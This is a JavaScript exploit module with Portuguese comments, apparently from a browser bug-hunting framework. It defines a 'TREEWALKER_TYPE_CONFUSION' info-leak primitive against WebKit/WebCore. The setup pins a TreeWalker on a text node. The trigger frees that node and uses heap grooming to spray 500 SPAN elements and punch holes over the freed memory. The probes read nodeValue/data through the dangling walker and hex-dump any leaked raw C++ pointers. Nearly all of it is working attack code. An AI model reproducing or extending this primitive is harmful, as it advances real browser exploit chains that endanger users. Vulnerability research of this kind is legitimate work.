import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'TREEWALKER_TYPE_CONFUSION',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva de Info Leak: Explora a sobreposição de um TextNode e um Element (SPAN). ' +
        'Tentamos ler a propriedade .data ou .nodeValue do nó corrompido para ' +
        'vazar ponteiros brutos do WebCore C++ como se fossem caracteres de texto.',

    setup: function() {
        this.sandbox = document.createElement('div');
        // Adicionamos um texto grande para forçar uma alocação separada no C++
        this.sandbox.innerHTML = '<span>A</span><b>B</b>' + 'X'.repeat(100);
        document.body.appendChild(this.sandbox);
        
        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
        this.walker.nextNode(); // span
        this.walker.nextNode(); // text node "A"
        this.walker.nextNode(); // b
        this.walker.nextNode(); // text node "B"
        
        // Travamos o walker num nó de texto (TextNode)
        this.targetNode = this.walker.currentNode;

        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
    },

    trigger: function() {
        // 1. Destrói o DOM original para libertar o TextNode
        this.sandbox.innerHTML = '';
        
        // 2. Grooming: Tentamos forçar a alocação de SPANs sobre a memória livre.
        // O SPAN tem uma estrutura de dados C++ mais gorda (HTMLElement).
        let nodes = Groomer.sprayDOM('span', 500);
        Groomer.punchHoles(nodes, 2);
    },

    probe: [
        // Probe 0: Verifica se o Type Confusion ocorreu novamente
        s => s.walker.currentNode.nodeName,
        
        // Probe 1: A TENTATIVA DE LEAK (Info Leak)
        s => {
            try {
                // Lemos o valor do nó. Se ele ainda for um TextNode, devia retornar "B".
                // Se ele for um Element (SPAN), devia retornar "null".
                // MAS, como é Type Confusion, ele pode ler o C++ bruto e retornar lixo!
                let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
                
                if (leakedData !== 'B' && leakedData !== null && leakedData !== undefined) {
                    // Temos dados corrompidos! Vamos convertê-los para Hexadecimal
                    let hexDump = '';
                    for (let i = 0; i < Math.min(leakedData.length, 8); i++) {
                        hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0');
                    }
                    return `💥 SUCESSO! INFO LEAK: 0x${hexDump}`;
                }
                return `Sem Leak visível (Data: ${leakedData})`;
            } catch(e) {
                return `Crash na leitura: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        try { this.sandbox.remove(); } catch(e) {}
    }
};
